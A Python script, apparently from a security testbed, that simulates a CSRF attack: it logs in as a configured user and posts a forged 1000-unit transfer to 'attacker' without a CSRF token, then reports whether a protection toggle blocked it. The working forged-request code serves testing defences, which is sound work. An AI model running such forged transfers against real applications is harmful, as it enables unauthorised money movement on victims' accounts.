"""
CSRF (Cross-Site Request Forgery) Attack
==========================================
Simulates a CSRF attack against the /transfer endpoint.

Steps:
    1. Log in as a legitimate user to obtain a session cookie.
    2. POST to /transfer WITHOUT a valid CSRF token (simulates a forged cross-site request).
    3. Observe whether the transfer is accepted or blocked.

Behaviour with controls:
    ✅ CSRF_PROTECTION ON  → missing/invalid token → "CSRF ATTACK BLOCKED"
    ❌ CSRF_PROTECTION OFF → transfer accepted without a token

Output:
    {
        "attack": "csrf",
        "attack_type": "CSRF Transfer",
        "success": true/false,
        "tte": <seconds>,
        "attempts": 1,
        "details": "..."
    }
"""

import time
import requests

from config import TARGET_URL, USERS


def run_csrf_attack(attacker_username: str = "user1", verbose: bool = True) -> dict:
    """
    Execute a CSRF attack against /transfer.

    Args:
        attacker_username: Legitimate user to log in as (provides valid session).
        verbose:           Print progress to stdout.

    Returns:
        dict with keys: attack, attack_type, success, tte, attempts, details
    """
    login_url    = f"{TARGET_URL}/login"
    transfer_url = f"{TARGET_URL}/transfer"

    attacker = USERS.get(attacker_username)
    if not attacker:
        return {
            "attack": "csrf",
            "attack_type": "CSRF Transfer",
            "success": False,
            "tte": 0.0,
            "attempts": 1,
            "details": f"Unknown attacker username: {attacker_username}",
        }

    start_time = time.time()

    if verbose:
        print(f"\n{'='*60}")
        print(f"  🎭 CSRF ATTACK")
        print(f"  Attacker  : {attacker_username}")
        print(f"  Login URL : {login_url}")
        print(f"  Target    : POST {transfer_url} (no CSRF token)")
        print(f"{'='*60}\n")

    session = requests.Session()

    # ── Step 1: Authenticate to get a valid session cookie ───────────────────
    try:
        login_resp = session.post(
            login_url,
            json={"username": attacker_username, "password": attacker["password"]},
            timeout=5,
        )
    except requests.ConnectionError:
        elapsed = round(time.time() - start_time, 4)
        details = "Connection refused — is the target webapp running?"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "csrf",
            "attack_type": "CSRF Transfer",
            "success": False,
            "tte": elapsed,
            "attempts": 1,
            "details": details,
        }

    if login_resp.status_code != 200:
        elapsed = round(time.time() - start_time, 4)
        details = f"Login failed ({login_resp.status_code})"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "csrf",
            "attack_type": "CSRF Transfer",
            "success": False,
            "tte": elapsed,
            "attempts": 1,
            "details": details,
        }

    if verbose:
        print(f"  ✅ Logged in as {attacker_username}")

    # ── Step 2: Send forged transfer — NO csrf_token field ───────────────────
    if verbose:
        print(f"  🎭 Sending forged POST to /transfer (no CSRF token)...")

    try:
        transfer_resp = session.post(
            transfer_url,
            data={"amount": "1000", "recipient": "attacker"},  # no csrf_token
            timeout=5,
        )
    except requests.ConnectionError:
        elapsed = round(time.time() - start_time, 4)
        details = "Connection refused on /transfer"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "csrf",
            "attack_type": "CSRF Transfer",
            "success": False,
            "tte": elapsed,
            "attempts": 1,
            "details": details,
        }

    elapsed = round(time.time() - start_time, 4)
    body = transfer_resp.text

    if "CSRF ATTACK BLOCKED" in body:
        success = False
        details = "CSRF token validation blocked the forged request"
        if verbose:
            print(f"  🛡️  CSRF protection blocked the forged transfer")
    elif transfer_resp.status_code in (200, 302):
        # Transfer not blocked — CSRF_PROTECTION is off
        success = True
        details = f"Forged transfer accepted — CSRF protection disabled. Status={transfer_resp.status_code}"
        if verbose:
            print(f"  💥 CSRF SUCCESS — forged transfer was accepted")
    else:
        success = False
        details = f"Unexpected response. Status={transfer_resp.status_code}. Body={body[:200]!r}"
        if verbose:
            print(f"  ❓ Unexpected response: {details}")

    result = {
        "attack": "csrf",
        "attack_type": "CSRF Transfer",
        "success": success,
        "tte": elapsed,
        "attempts": 1,
        "details": details,
    }

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Result  : {'✅ EXPLOIT SUCCESS' if success else '❌ EXPLOIT FAILED'}")
        print(f"  TTE     : {elapsed}s")
        print(f"  Details : {details}")
        print(f"{'─'*60}\n")

    return result


# ─── Standalone execution ────────────────────────────────────────────────────
if __name__ == "__main__":
    result = run_csrf_attack()
    print("\nRaw result:")
    import json
    print(json.dumps(result, indent=2))
